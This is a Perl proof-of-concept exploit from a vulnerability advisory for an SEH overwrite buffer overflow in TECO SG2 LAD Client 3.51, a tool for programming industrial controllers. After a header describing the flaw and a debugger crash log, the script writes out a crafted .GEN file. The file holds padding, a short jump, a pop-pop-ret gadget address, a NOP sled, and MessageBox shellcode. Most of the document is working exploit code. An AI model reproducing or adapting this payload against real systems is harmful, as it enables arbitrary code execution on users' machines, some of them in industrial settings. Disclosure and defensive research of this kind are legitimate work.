﻿#!/usr/bin/perl
#
#
# TECO SG2 LAD Client 3.51 SEH Overwrite Buffer Overflow Exploit
#
#
# Vendor: TECO Electric and Machinery Co., Ltd.
# Product web page: http://www.teco-group.eu
# Download: http://globalsa.teco.com.tw/support_download.aspx?KindID=9
# Affected version: 3.51 and 3.40
#
# Summary: SG2 Client is a program that enables to create and edit applications.
# The program is providing two edit modes, LADDER and FBD to rapidly and directly
# input the required app. The Simulation Mode allows users to virtually run and test
# the program before it is loaded to the controller.
#
# Desc: The vulnerability is caused due to a boundary error in the processing of a
# Genie LAD file, which can be exploited to cause a buffer overflow when a user opens
# e.g. a specially crafted .GEN file. Successful exploitation could allow execution
# of arbitrary code on the affected machine.
#
# ---------------------------------------------------------------------------------
# (10bc.1358): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=00000000 ecx=43434343 edx=7794b4ad esi=00000000 edi=00000000
# eip=43434343 esp=0018dc24 ebp=0018dc44 iopl=0         nv up ei pl zr na pe nc
# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
# 43434343 ??              ???
# 0:000> !exchain
# 0018dc38: ntdll!LdrRemoveLoadAsDataTable+d64 (7794b4ad)
# 0018e1d4: ntdll!LdrRemoveLoadAsDataTable+d64 (7794b4ad)
# 0018e800: MFC42!Ordinal1580+373 (708df2fc)
# 0018f098: 43434343
# Invalid exception stack at 42424242
# ---------------------------------------------------------------------------------
#
# Tested on: Microsoft Windows 7 Professional SP1 (EN) 64bit
#            Microsoft Windows 7 Ultimate SP1 (EN) 64bit
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2015-5275
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5275.php
#
#
# 09.10.2015]
#


# 113 bytes MessageBox shellcode
my $sc = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42".
         "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03".
         "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b".
         "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e".
         "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c".
         "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x65\x64".
         "\x21\x01\x68\x20\x50\x77\x6e\x68\x20\x5a\x53\x4c\x89\xe1\xfe".
         "\x49\x0b\x31\xc0\x51\x50\xff\xd7";

# Address = 0041D659
# Message = 0x0041d659 : pop edi # pop esi # ret 0x04
# startnull {PAGE_EXECUTE_READ} [LAD.exe]
# ASLR: False;
# Rebase: False;
# SafeSEH: False;
# OS: False;
# v0.2.9.0 (C:\Program Files (x86)\TECO\SG2 Client\LAD.exe)

my $file = "lad.gen";
my $junk = "\x41" x 21750 . "\xEB\x08\x90\x90" . "\x59\xd6\x41\x00" . "\x90" x 28 . $sc . "\x90" x 20;
open($FILE,">$file");
print $FILE "$junk";
close($FILE);
print "Malicious GEN file created successfully!\n";